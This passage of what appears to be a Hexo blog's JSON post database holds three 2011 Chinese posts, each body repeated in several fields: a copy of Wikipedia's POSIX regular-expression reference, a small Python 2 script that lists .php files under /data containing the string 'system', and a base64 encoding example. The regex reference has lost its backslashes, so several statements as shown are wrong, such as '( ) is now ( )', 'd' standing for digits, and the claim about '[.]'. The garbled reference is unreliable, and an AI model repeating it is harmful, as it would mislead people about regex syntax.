expressions</i>.\nC默认在*NIX下面，可以使用这些规则，最基本的POSIX语法，不需要其他的扩展库。","slug":"POSIX-basic-and-extended","published":1,"updated":"2023-04-22T05:38:44.689Z","_id":"clgrjlxj000687opid5aphjqt","comments":1,"layout":"post","photos":[],"link":"","content":"<p><strong>引用：<a href=\"http://en.wikipedia.org/wiki/Regular_expression\">http://en.wikipedia.org/wiki/Regular_expression</a></strong></p>\n<h4>POSIX basic and extended[<a title=\"Edit section: POSIX basic and extended\" href=\"http://en.wikipedia.org/w/index.php?title=Regular_expression&amp;action=edit&amp;section=10\">edit</a>]</h4>\nIn the <a title=\"POSIX\" href=\"http://en.wikipedia.org/wiki/POSIX\">POSIX</a> standard, Basic Regular Syntax, BRE, requires that the <a title=\"Metacharacter\" href=\"http://en.wikipedia.org/wiki/Metacharacter\">metacharacters</a> ( ) and { } be designated () and {}, whereas Extended Regular Syntax, ERE, does not.\n<table>\n<tbody>\n<tr>\n<th>Metacharacter</th>\n<th>Description</th>\n</tr>\n<tr valign=\"top\">\n<th>.</th>\n<td>Matches any single character (many applications exclude <a title=\"Newline\" href=\"http://en.wikipedia.org/wiki/Newline\">newlines</a>, and exactly which characters are considered newlines is flavor-, character-encoding-, and platform-specific, but it is safe to assume that the line feed character is included). Within POSIX bracket expressions, the dot character matches a literal dot. For example, a.c matches \"abc\", etc., but [a.c] matches only \"a\", \".\", or \"c\".</td>\n</tr>\n<tr valign=\"top\">\n<th>[ ]</th>\n<td>A bracket expression. Matches a single character that is contained within the brackets. For example, [abc] matches \"a\", \"b\", or \"c\". [a-z]specifies a range which matches any lowercase letter from \"a\" to \"z\". These forms can be mixed: [abcx-z] matches \"a\", \"b\", \"c\", \"x\", \"y\", or \"z\", as does [a-cx-z].The - character is treated as a literal character if it is the last or the first (after the ^, if present) character within the brackets: [abc-], [-abc]. Note that backslash escapes are not allowed. The ] character can be included in a bracket expression if it is the first (after the ^) character: []abc].</td>\n</tr>\n<tr valign=\"top\">\n<th>[^ ]</th>\n<td>Matches a single character that is not contained within the brackets. For example, [^abc] matches any character other than \"a\", \"b\", or \"c\".[^a-z] matches any single character that is not a lowercase letter from \"a\" to \"z\". Likewise, literal characters and ranges can be mixed.</td>\n</tr>\n<tr valign=\"top\">\n<th>^</th>\n<td>Matches the starting position within the string. In line-based tools, it matches the starting position of any line.</td>\n</tr>\n<tr valign=\"top\">\n<th>$</th>\n<td>Matches the ending position of the string or the position just before a string-ending newline. In line-based tools, it matches the ending position of any line.</td>\n</tr>\n<tr valign=\"top\">\n<th>( )</th>\n<td>Defines a marked subexpression. The string matched within the parentheses can be recalled later (see the next entry, <i>n</i>). A marked subexpression is also called a block or capturing group. <b>BRE mode requires ( )</b>.</td>\n</tr>\n<tr valign=\"top\">\n<th><i>n</i></th>\n<td>Matches what the <i>n</i>th marked subexpression matched, where <i>n</i> is a digit from 1 to 9. This construct is vaguely defined in the POSIX.2 standard. Some tools allow referencing more than nine capturing groups.</td>\n</tr>\n<tr valign=\"top\">\n<th>*</th>\n<td>Matches the preceding element zero or more times. For example, ab*c matches \"ac\", \"abc\", \"abbbc\", etc. [xyz]* matches \"\", \"x\", \"y\", \"z\", \"zx\", \"zyx\", \"xyzzy\", and so on. (ab)* matches \"\", \"ab\", \"abab\", \"ababab\", and so on.</td>\n</tr>\n<tr valign=\"top\">\n<th>{<i>m</i>,<i>n</i>}</th>\n<td>Matches the preceding element at least <i>m</i> and not more than <i>n</i> times. For example, a{3,5} matches only \"aaa\", \"aaaa\", and \"aaaaa\". This is not found in a few older instances of regular expressions. <b>BRE mode requires {<i>m</i>,<i>n</i>}</b>.</td>\n</tr>\n</tbody>\n</table>\n<b>Examples:</b>\n<ul>\n    <li>.at matches any three-character string ending with \"at\", including \"hat\", \"cat\", and \"bat\".</li>\n    <li>[hc]at matches \"hat\" and \"cat\".</li>\n    <li>[^b]at matches all strings matched by .at except \"bat\".</li>\n    <li>[^hc]at matches all strings matched by .at other than \"hat\" and \"cat\".</li>\n    <li>^[hc]at matches \"hat\" and \"cat\", but only at the beginning of the string or line.</li>\n    <li>[hc]at$ matches \"hat\" and \"cat\", but only at the end of the string or line.</li>\n    <li>[.] matches any single character surrounded by \"[\" and \"]\" since the brackets are escaped, for example: \"[a]\" and \"[b]\".</li>\n    <li>s.* matches any number of characters preceded by s , for example: \"saw\" and \"seed\".</li>\n</ul>\n<h4>POSIX extended[<a title=\"Edit section: POSIX extended\" href=\"http://en.wikipedia.org/w/index.php?title=Regular_expression&amp;action=edit&amp;section=11\">edit</a>]</h4>\nThe meaning of metacharacters <a title=\"Escape sequence\" href=\"http://en.wikipedia.org/wiki/Escape_sequence\">escaped</a> with a backslash is reversed for some characters in the POSIX Extended Regular Expression (ERE) syntax. With this syntax, a backslash causes the metacharacter to be treated as a literal character. So, for example, ( ) is now ( ) and { } is now { }. Additionally, support is removed for <i>n</i> backreferences and the following metacharacters are added:\n<table>\n<tbody>\n<tr>\n<th>Metacharacter</th>\n<th>Description</th>\n</tr>\n<tr valign=\"top\">\n<th>?</th>\n<td>Matches the preceding element zero or one time. For example, ab?c matches only \"ac\" or \"abc\".</td>\n</tr>\n<tr>\n<th>+</th>\n<td>Matches the preceding element one or more times. For example, ab+c matches \"abc\", \"abbc\", \"abbbc\", and so on, but not \"ac\".</td>\n</tr>\n<tr>\n<th>|</th>\n<td>The choice (also known as alternation or set union) operator matches either the expression before or the expression after the operator. For example, abc|def matches \"abc\" or \"def\".</td>\n</tr>\n</tbody>\n</table>\n<b>Examples:</b>\n<ul>\n    <li>[hc]+at matches \"hat\", \"cat\", \"hhat\", \"chat\", \"hcat\", \"cchchat\", and so on, but not \"at\".</li>\n    <li>[hc]?at matches \"hat\", \"cat\", and \"at\".</li>\n    <li>[hc]*at matches \"hat\", \"cat\", \"hhat\", \"chat\", \"hcat\", \"cchchat\", \"at\", and so on.</li>\n    <li>cat|dog matches \"cat\" or \"dog\".</li>\n</ul>\nPOSIX Extended Regular Expressions can often be used with modern Unix utilities by including the <a title=\"Command line\" href=\"http://en.wikipedia.org/wiki/Command_line\">command line</a> flag <var>-E</var>.\n<h4>Character classes[<a title=\"Edit section: Character classes\" href=\"http://en.wikipedia.org/w/index.php?title=Regular_expression&amp;action=edit&amp;section=12\">edit</a>]</h4>\nThe character class is the most basic regular expression concept after a literal match. It makes one small sequence of characters match a larger set of characters. For example, [A-Z] could stand for the alphabet, and d could mean any digit. Character classes apply to both POSIX levels.\nWhen specifying a range of characters, such as [a-Z] computer's locale settings determine the contents by the numeric ordering of the character encoding. They could store digits in that sequence, or the ordering could be <i>abc...zABC...Z</i>, or <i>aAbBcC...zZ</i>. So the POSIX standard defines a character class, which will be known by the regular expression processor installed. Those definitions are in the following table:\n<table>\n<tbody>\n<tr>\n<th>POSIX</th>\n<th>Non-standard</th>\n<th>Perl/Tcl</th>\n<th>Vim</th>\n<th>ASCII</th>\n<th>Description</th>\n</tr>\n<tr>\n<td>[:alnum:]</td>\n<td></td>\n<td></td>\n<td></td>\n<td>[A-Za-z0-9]</td>\n<td>Alphanumeric characters</td>\n</tr>\n<tr>\n<td></td>\n<td>[:word:]</td>\n<td>w</td>\n<td>w</td>\n<td>[A-Za-z0-9_]</td>\n<td>Alphanumeric characters plus \"_\"</td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n<td>W</td>\n<td>W</td>\n<td>[^A-Za-z0-9_]</td>\n<td>Non-word characters</td>\n</tr>\n<tr>\n<td>[:alpha:]</td>\n<td></td>\n<td></td>\n<td>a</td>\n<td>[A-Za-z]</td>\n<td>Alphabetic characters</td>\n</tr>\n<tr>\n<td>[:blank:]</td>\n<td></td>\n<td></td>\n<td>s</td>\n<td>[ <a title=\"t\" href=\"http://en.wikipedia.org/wiki/%5Ct\">t</a>]</td>\n<td>Space and tab</td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n<td>b</td>\n<td>&lt; &gt;</td>\n<td>(?&lt;=W)(?=w)|(?&lt;=w)(?=W)</td>\n<td>Word boundaries</td>\n</tr>\n<tr>\n<td>[:cntrl:]</td>\n<td></td>\n<td></td>\n<td></td>\n<td>[x00-x1Fx7F]</td>\n<td><a title=\"Control character\" href=\"http://en.wikipedia.org/wiki/Control_character\">Control characters</a></td>\n</tr>\n<tr>\n<td>[:digit:]</td>\n<td></td>\n<td>d</td>\n<td>d</td>\n<td>[0-9]</td>\n<td>Digits</td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n<td>D</td>\n<td>D</td>\n<td>[^0-9]</td>\n<td>Non-digits</td>\n</tr>\n<tr>\n<td>[:graph:]</td>\n<td></td>\n<td></td>\n<td></td>\n<td>[x21-x7E]</td>\n<td>Visible characters</td>\n</tr>\n<tr>\n<td>[:lower:]</td>\n<td></td>\n<td></td>\n<td>l</td>\n<td>[a-z]</td>\n<td>Lowercase letters</td>\n</tr>\n<tr>\n<td>[:print:]</td>\n<td></td>\n<td></td>\n<td>p</td>\n<td>[x20-x7E]</td>\n<td>Visible characters and the space character</td>\n</tr>\n<tr>\n<td>[:punct:]</td>\n<td></td>\n<td></td>\n<td></td>\n<td>[][!\"#$%&amp;'()*+,./:;&lt;=&gt;?@^_`{|}~-]</td>\n<td>Punctuation characters</td>\n</tr>\n<tr>\n<td>[:space:]</td>\n<td></td>\n<td>s</td>\n<td>_s</td>\n<td>[ <a title=\"t\" href=\"http://en.wikipedia.org/wiki/%5Ct\">t</a><a title=\"r\" href=\"http://en.wikipedia.org/wiki/%5Cr\">r</a><a title=\"n\" href=\"http://en.wikipedia.org/wiki/%5Cn\">n</a><a title=\"v\" href=\"http://en.wikipedia.org/wiki/%5Cv\">v</a><a title=\"f\" href=\"http://en.wikipedia.org/wiki/%5Cf\">f</a>]</td>\n<td><a title=\"Whitespace character\" href=\"http://en.wikipedia.org/wiki/Whitespace_character\">Whitespace characters</a></td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n<td>S</td>\n<td></td>\n<td>[^ trnvf]</td>\n<td>Non-whitespace characters</td>\n</tr>\n<tr>\n<td>[:upper:]</td>\n<td></td>\n<td></td>\n<td>u</td>\n<td>[A-Z]</td>\n<td>Uppercase letters</td>\n</tr>\n<tr>\n<td>[:xdigit:]</td>\n<td></td>\n<td></td>\n<td>x</td>\n<td>[A-Fa-f0-9]</td>\n<td>Hexadecimal digits</td>\n</tr>\n</tbody>\n</table>\nPOSIX character classes can only be used within bracket expressions. For example, [[:upper:]ab] matches the uppercase letters and lowercase \"a\" and \"b\".\nAn additional non-POSIX class understood by some tools is [:word:], which is usually defined as [:alnum:] plus underscore. This reflects the fact that in many programming languages these are the characters that may be used in identifiers. The editor <a title=\"Vim (text editor)\" href=\"http://en.wikipedia.org/wiki/Vim_(text_editor)\">Vim</a> further distinguishes <i>word</i> and <i>word-head</i> classes (using the notation w and h) since in many programming languages the characters that can begin an identifier are not the same as those that can occur in other positions.\nNote that what the POSIX regular expression standards call <i>character classes</i> are commonly referred to as <i>POSIX character classes</i> in other regular expression flavors which support them. With most other regular expression flavors, the term <i>character class</i> is used to describe what POSIX calls <i>bracket expressions</i>.\nC默认在*NIX下面，可以使用这些规则，最基本的POSIX语法，不需要其他的扩展库。","site":{"data":{}},"excerpt":"","more":"<p><strong>引用：<a href=\"http://en.wikipedia.org/wiki/Regular_expression\">http://en.wikipedia.org/wiki/Regular_expression</a></strong></p>\n<h4>POSIX basic and extended[<a title=\"Edit section: POSIX basic and extended\" href=\"http://en.wikipedia.org/w/index.php?title=Regular_expression&amp;action=edit&amp;section=10\">edit</a>]</h4>\nIn the <a title=\"POSIX\" href=\"http://en.wikipedia.org/wiki/POSIX\">POSIX</a> standard, Basic Regular Syntax, BRE, requires that the <a title=\"Metacharacter\" href=\"http://en.wikipedia.org/wiki/Metacharacter\">metacharacters</a> ( ) and { } be designated () and {}, whereas Extended Regular Syntax, ERE, does not.\n<table>\n<tbody>\n<tr>\n<th>Metacharacter</th>\n<th>Description</th>\n</tr>\n<tr valign=\"top\">\n<th>.</th>\n<td>Matches any single character (many applications exclude <a title=\"Newline\" href=\"http://en.wikipedia.org/wiki/Newline\">newlines</a>, and exactly which characters are considered newlines is flavor-, character-encoding-, and platform-specific, but it is safe to assume that the line feed character is included). Within POSIX bracket expressions, the dot character matches a literal dot. For example, a.c matches \"abc\", etc., but [a.c] matches only \"a\", \".\", or \"c\".</td>\n</tr>\n<tr valign=\"top\">\n<th>[ ]</th>\n<td>A bracket expression. Matches a single character that is contained within the brackets. For example, [abc] matches \"a\", \"b\", or \"c\". [a-z]specifies a range which matches any lowercase letter from \"a\" to \"z\". These forms can be mixed: [abcx-z] matches \"a\", \"b\", \"c\", \"x\", \"y\", or \"z\", as does [a-cx-z].The - character is treated as a literal character if it is the last or the first (after the ^, if present) character within the brackets: [abc-], [-abc]. Note that backslash escapes are not allowed. The ] character can be included in a bracket expression if it is the first (after the ^) character: []abc].</td>\n</tr>\n<tr valign=\"top\">\n<th>[^ ]</th>\n<td>Matches a single character that is not contained within the brackets. For example, [^abc] matches any character other than \"a\", \"b\", or \"c\".[^a-z] matches any single character that is not a lowercase letter from \"a\" to \"z\". Likewise, literal characters and ranges can be mixed.</td>\n</tr>\n<tr valign=\"top\">\n<th>^</th>\n<td>Matches the starting position within the string. In line-based tools, it matches the starting position of any line.</td>\n</tr>\n<tr valign=\"top\">\n<th>$</th>\n<td>Matches the ending position of the string or the position just before a string-ending newline. In line-based tools, it matches the ending position of any line.</td>\n</tr>\n<tr valign=\"top\">\n<th>( )</th>\n<td>Defines a marked subexpression. The string matched within the parentheses can be recalled later (see the next entry, <i>n</i>). A marked subexpression is also called a block or capturing group. <b>BRE mode requires ( )</b>.</td>\n</tr>\n<tr valign=\"top\">\n<th><i>n</i></th>\n<td>Matches what the <i>n</i>th marked subexpression matched, where <i>n</i> is a digit from 1 to 9. This construct is vaguely defined in the POSIX.2 standard. Some tools allow referencing more than nine capturing groups.</td>\n</tr>\n<tr valign=\"top\">\n<th>*</th>\n<td>Matches the preceding element zero or more times. For example, ab*c matches \"ac\", \"abc\", \"abbbc\", etc. [xyz]* matches \"\", \"x\", \"y\", \"z\", \"zx\", \"zyx\", \"xyzzy\", and so on. (ab)* matches \"\", \"ab\", \"abab\", \"ababab\", and so on.</td>\n</tr>\n<tr valign=\"top\">\n<th>{<i>m</i>,<i>n</i>}</th>\n<td>Matches the preceding element at least <i>m</i> and not more than <i>n</i> times. For example, a{3,5} matches only \"aaa\", \"aaaa\", and \"aaaaa\". This is not found in a few older instances of regular expressions. <b>BRE mode requires {<i>m</i>,<i>n</i>}</b>.</td>\n</tr>\n</tbody>\n</table>\n<b>Examples:</b>\n<ul>\n    <li>.at matches any three-character string ending with \"at\", including \"hat\", \"cat\", and \"bat\".</li>\n    <li>[hc]at matches \"hat\" and \"cat\".</li>\n    <li>[^b]at matches all strings matched by .at except \"bat\".</li>\n    <li>[^hc]at matches all strings matched by .at other than \"hat\" and \"cat\".</li>\n    <li>^[hc]at matches \"hat\" and \"cat\", but only at the beginning of the string or line.</li>\n    <li>[hc]at$ matches \"hat\" and \"cat\", but only at the end of the string or line.</li>\n    <li>[.] matches any single character surrounded by \"[\" and \"]\" since the brackets are escaped, for example: \"[a]\" and \"[b]\".</li>\n    <li>s.* matches any number of characters preceded by s , for example: \"saw\" and \"seed\".</li>\n</ul>\n<h4>POSIX extended[<a title=\"Edit section: POSIX extended\" href=\"http://en.wikipedia.org/w/index.php?title=Regular_expression&amp;action=edit&amp;section=11\">edit</a>]</h4>\nThe meaning of metacharacters <a title=\"Escape sequence\" href=\"http://en.wikipedia.org/wiki/Escape_sequence\">escaped</a> with a backslash is reversed for some characters in the POSIX Extended Regular Expression (ERE) syntax. With this syntax, a backslash causes the metacharacter to be treated as a literal character. So, for example, ( ) is now ( ) and { } is now { }. Additionally, support is removed for <i>n</i> backreferences and the following metacharacters are added:\n<table>\n<tbody>\n<tr>\n<th>Metacharacter</th>\n<th>Description</th>\n</tr>\n<tr valign=\"top\">\n<th>?</th>\n<td>Matches the preceding element zero or one time. For example, ab?c matches only \"ac\" or \"abc\".</td>\n</tr>\n<tr>\n<th>+</th>\n<td>Matches the preceding element one or more times. For example, ab+c matches \"abc\", \"abbc\", \"abbbc\", and so on, but not \"ac\".</td>\n</tr>\n<tr>\n<th>|</th>\n<td>The choice (also known as alternation or set union) operator matches either the expression before or the expression after the operator. For example, abc|def matches \"abc\" or \"def\".</td>\n</tr>\n</tbody>\n</table>\n<b>Examples:</b>\n<ul>\n    <li>[hc]+at matches \"hat\", \"cat\", \"hhat\", \"chat\", \"hcat\", \"cchchat\", and so on, but not \"at\".</li>\n    <li>[hc]?at matches \"hat\", \"cat\", and \"at\".</li>\n    <li>[hc]*at matches \"hat\", \"cat\", \"hhat\", \"chat\", \"hcat\", \"cchchat\", \"at\", and so on.</li>\n    <li>cat|dog matches \"cat\" or \"dog\".</li>\n</ul>\nPOSIX Extended Regular Expressions can often be used with modern Unix utilities by including the <a title=\"Command line\" href=\"http://en.wikipedia.org/wiki/Command_line\">command line</a> flag <var>-E</var>.\n<h4>Character classes[<a title=\"Edit section: Character classes\" href=\"http://en.wikipedia.org/w/index.php?title=Regular_expression&amp;action=edit&amp;section=12\">edit</a>]</h4>\nThe character class is the most basic regular expression concept after a literal match. It makes one small sequence of characters match a larger set of characters. For example, [A-Z] could stand for the alphabet, and d could mean any digit. Character classes apply to both POSIX levels.\nWhen specifying a range of characters, such as [a-Z] computer's locale settings determine the contents by the numeric ordering of the character encoding. They could store digits in that sequence, or the ordering could be <i>abc...zABC...Z</i>, or <i>aAbBcC...zZ</i>. So the POSIX standard defines a character class, which will be known by the regular expression processor installed. Those definitions are in the following table:\n<table>\n<tbody>\n<tr>\n<th>POSIX</th>\n<th>Non-standard</th>\n<th>Perl/Tcl</th>\n<th>Vim</th>\n<th>ASCII</th>\n<th>Description</th>\n</tr>\n<tr>\n<td>[:alnum:]</td>\n<td></td>\n<td></td>\n<td></td>\n<td>[A-Za-z0-9]</td>\n<td>Alphanumeric characters</td>\n</tr>\n<tr>\n<td></td>\n<td>[:word:]</td>\n<td>w</td>\n<td>w</td>\n<td>[A-Za-z0-9_]</td>\n<td>Alphanumeric characters plus \"_\"</td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n<td>W</td>\n<td>W</td>\n<td>[^A-Za-z0-9_]</td>\n<td>Non-word characters</td>\n</tr>\n<tr>\n<td>[:alpha:]</td>\n<td></td>\n<td></td>\n<td>a</td>\n<td>[A-Za-z]</td>\n<td>Alphabetic characters</td>\n</tr>\n<tr>\n<td>[:blank:]</td>\n<td></td>\n<td></td>\n<td>s</td>\n<td>[ <a title=\"t\" href=\"http://en.wikipedia.org/wiki/%5Ct\">t</a>]</td>\n<td>Space and tab</td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n<td>b</td>\n<td>&lt; &gt;</td>\n<td>(?&lt;=W)(?=w)|(?&lt;=w)(?=W)</td>\n<td>Word boundaries</td>\n</tr>\n<tr>\n<td>[:cntrl:]</td>\n<td></td>\n<td></td>\n<td></td>\n<td>[x00-x1Fx7F]</td>\n<td><a title=\"Control character\" href=\"http://en.wikipedia.org/wiki/Control_character\">Control characters</a></td>\n</tr>\n<tr>\n<td>[:digit:]</td>\n<td></td>\n<td>d</td>\n<td>d</td>\n<td>[0-9]</td>\n<td>Digits</td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n<td>D</td>\n<td>D</td>\n<td>[^0-9]</td>\n<td>Non-digits</td>\n</tr>\n<tr>\n<td>[:graph:]</td>\n<td></td>\n<td></td>\n<td></td>\n<td>[x21-x7E]</td>\n<td>Visible characters</td>\n</tr>\n<tr>\n<td>[:lower:]</td>\n<td></td>\n<td></td>\n<td>l</td>\n<td>[a-z]</td>\n<td>Lowercase letters</td>\n</tr>\n<tr>\n<td>[:print:]</td>\n<td></td>\n<td></td>\n<td>p</td>\n<td>[x20-x7E]</td>\n<td>Visible characters and the space character</td>\n</tr>\n<tr>\n<td>[:punct:]</td>\n<td></td>\n<td></td>\n<td></td>\n<td>[][!\"#$%&amp;'()*+,./:;&lt;=&gt;?@^_`{|}~-]</td>\n<td>Punctuation characters</td>\n</tr>\n<tr>\n<td>[:space:]</td>\n<td></td>\n<td>s</td>\n<td>_s</td>\n<td>[ <a title=\"t\" href=\"http://en.wikipedia.org/wiki/%5Ct\">t</a><a title=\"r\" href=\"http://en.wikipedia.org/wiki/%5Cr\">r</a><a title=\"n\" href=\"http://en.wikipedia.org/wiki/%5Cn\">n</a><a title=\"v\" href=\"http://en.wikipedia.org/wiki/%5Cv\">v</a><a title=\"f\" href=\"http://en.wikipedia.org/wiki/%5Cf\">f</a>]</td>\n<td><a title=\"Whitespace character\" href=\"http://en.wikipedia.org/wiki/Whitespace_character\">Whitespace characters</a></td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n<td>S</td>\n<td></td>\n<td>[^ trnvf]</td>\n<td>Non-whitespace characters</td>\n</tr>\n<tr>\n<td>[:upper:]</td>\n<td></td>\n<td></td>\n<td>u</td>\n<td>[A-Z]</td>\n<td>Uppercase letters</td>\n</tr>\n<tr>\n<td>[:xdigit:]</td>\n<td></td>\n<td></td>\n<td>x</td>\n<td>[A-Fa-f0-9]</td>\n<td>Hexadecimal digits</td>\n</tr>\n</tbody>\n</table>\nPOSIX character classes can only be used within bracket expressions. For example, [[:upper:]ab] matches the uppercase letters and lowercase \"a\" and \"b\".\nAn additional non-POSIX class understood by some tools is [:word:], which is usually defined as [:alnum:] plus underscore. This reflects the fact that in many programming languages these are the characters that may be used in identifiers. The editor <a title=\"Vim (text editor)\" href=\"http://en.wikipedia.org/wiki/Vim_(text_editor)\">Vim</a> further distinguishes <i>word</i> and <i>word-head</i> classes (using the notation w and h) since in many programming languages the characters that can begin an identifier are not the same as those that can occur in other positions.\nNote that what the POSIX regular expression standards call <i>character classes</i> are commonly referred to as <i>POSIX character classes</i> in other regular expression flavors which support them. With most other regular expression flavors, the term <i>character class</i> is used to describe what POSIX calls <i>bracket expressions</i>.\nC默认在*NIX下面，可以使用这些规则，最基本的POSIX语法，不需要其他的扩展库。"},{"title":"python 小脚本","date":"2011-10-10T06:14:00.000Z","_content":"<p>#!/usr/bin/env python<br />import os<br /><br />dirpath=&quot;/data&quot;<br />ext=&quot;.php&quot;<br />key=&quot;system&quot;<br />x=[]<br />y=[]<br />z=[]<br />def _isdir(path):<br />&nbsp;&nbsp; &nbsp;for i in os.listdir(path):<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if os.path.isdir(path+'/'+i):<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;_isdir(path+'/'+i)<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;x.append(path+'/'+i)&nbsp;&nbsp; &nbsp;<br />def _exfile(file):<br />&nbsp;&nbsp; &nbsp;if file[-4:]==ext:<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;y.append(file)<br />def _file(file1):<br />&nbsp;&nbsp; &nbsp;f=open(file1,'r')<br />&nbsp;&nbsp; &nbsp;for i in f:<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if not i.find(key) == -1:<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;z.append(file1)<br />&nbsp;&nbsp; &nbsp;f.close()<br />_isdir(dirpath)<br />for i in x:<br />&nbsp;&nbsp; &nbsp;_exfile(i)<br />for a in y:<br />&nbsp;&nbsp; &nbsp;_file(a)<br />abc=set(z)<br />for i in abc:<br />&nbsp;&nbsp; &nbsp;print i<br /></p>","source":"_posts/python-小脚本.md","raw":"title: python 小脚本\ncategories: [程序设计,Python编程]\ntags: []\ndate: 2011-10-10 14:14:00\n---\n<p>#!/usr/bin/env python<br />import os<br /><br />dirpath=&quot;/data&quot;<br />ext=&quot;.php&quot;<br />key=&quot;system&quot;<br />x=[]<br />y=[]<br />z=[]<br />def _isdir(path):<br />&nbsp;&nbsp; &nbsp;for i in os.listdir(path):<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if os.path.isdir(path+'/'+i):<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;_isdir(path+'/'+i)<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;x.append(path+'/'+i)&nbsp;&nbsp; &nbsp;<br />def _exfile(file):<br />&nbsp;&nbsp; &nbsp;if file[-4:]==ext:<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;y.append(file)<br />def _file(file1):<br />&nbsp;&nbsp; &nbsp;f=open(file1,'r')<br />&nbsp;&nbsp; &nbsp;for i in f:<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if not i.find(key) == -1:<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;z.append(file1)<br />&nbsp;&nbsp; &nbsp;f.close()<br />_isdir(dirpath)<br />for i in x:<br />&nbsp;&nbsp; &nbsp;_exfile(i)<br />for a in y:<br />&nbsp;&nbsp; &nbsp;_file(a)<br />abc=set(z)<br />for i in abc:<br />&nbsp;&nbsp; &nbsp;print i<br /></p>","slug":"python-小脚本","published":1,"updated":"2023-04-22T05:38:44.896Z","_id":"clgrjlxj1006a7opif8un2abl","comments":1,"layout":"post","photos":[],"link":"","content":"<p>#!/usr/bin/env python<br />import os<br /><br />dirpath=&quot;/data&quot;<br />ext=&quot;.php&quot;<br />key=&quot;system&quot;<br />x=[]<br />y=[]<br />z=[]<br />def _isdir(path):<br />&nbsp;&nbsp; &nbsp;for i in os.listdir(path):<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if os.path.isdir(path+'/'+i):<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;_isdir(path+'/'+i)<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;x.append(path+'/'+i)&nbsp;&nbsp; &nbsp;<br />def _exfile(file):<br />&nbsp;&nbsp; &nbsp;if file[-4:]==ext:<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;y.append(file)<br />def _file(file1):<br />&nbsp;&nbsp; &nbsp;f=open(file1,'r')<br />&nbsp;&nbsp; &nbsp;for i in f:<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if not i.find(key) == -1:<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;z.append(file1)<br />&nbsp;&nbsp; &nbsp;f.close()<br />_isdir(dirpath)<br />for i in x:<br />&nbsp;&nbsp; &nbsp;_exfile(i)<br />for a in y:<br />&nbsp;&nbsp; &nbsp;_file(a)<br />abc=set(z)<br />for i in abc:<br />&nbsp;&nbsp; &nbsp;print i<br /></p>","site":{"data":{}},"excerpt":"","more":"<p>#!/usr/bin/env python<br />import os<br /><br />dirpath=&quot;/data&quot;<br />ext=&quot;.php&quot;<br />key=&quot;system&quot;<br />x=[]<br />y=[]<br />z=[]<br />def _isdir(path):<br />&nbsp;&nbsp; &nbsp;for i in os.listdir(path):<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if os.path.isdir(path+'/'+i):<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;_isdir(path+'/'+i)<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;x.append(path+'/'+i)&nbsp;&nbsp; &nbsp;<br />def _exfile(file):<br />&nbsp;&nbsp; &nbsp;if file[-4:]==ext:<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;y.append(file)<br />def _file(file1):<br />&nbsp;&nbsp; &nbsp;f=open(file1,'r')<br />&nbsp;&nbsp; &nbsp;for i in f:<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if not i.find(key) == -1:<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;z.append(file1)<br />&nbsp;&nbsp; &nbsp;f.close()<br />_isdir(dirpath)<br />for i in x:<br />&nbsp;&nbsp; &nbsp;_exfile(i)<br />for a in y:<br />&nbsp;&nbsp; &nbsp;_file(a)<br />abc=set(z)<br />for i in abc:<br />&nbsp;&nbsp; &nbsp;print i<br /></p>"},{"title":"python 使用base64加解密","date":"2011-10-31T08:25:00.000Z","_content":"<p>1.最简单的加解密实例，字符串</p><p>import&nbsp;base64&nbsp; </p><p>str1&nbsp;= ‘hello'</p><p>print str1</p><p>str2&nbsp;=&nbsp;base64.b64encode(str1) <br /></p><p>print str2<br /></p><p>str3&nbsp;=&nbsp;base64.b64decode(str2) <br /></p><p>print str3</p><p><br /></p><p>2.针对文件加解密</p><p>import base64</p><p>f1=open('1.txt','r')</p><p>f2=open('2.txt','w')<br /></p><p>base64.encode(f1,f2)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #加密,把f1的内容加密后写入f2</p><p>#base64.decode(f1,f2)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #解密,把f1的内容解密后写入f2</p><p>f1.close()</p><p>f2.close()</p><p><br /></p>","source":"_posts/python-使用base64加解密.md","raw":"title: python 使用base64加解密\ncategories: [程序设计,Python编程]\ntags: []\ndate: 2011-10-31 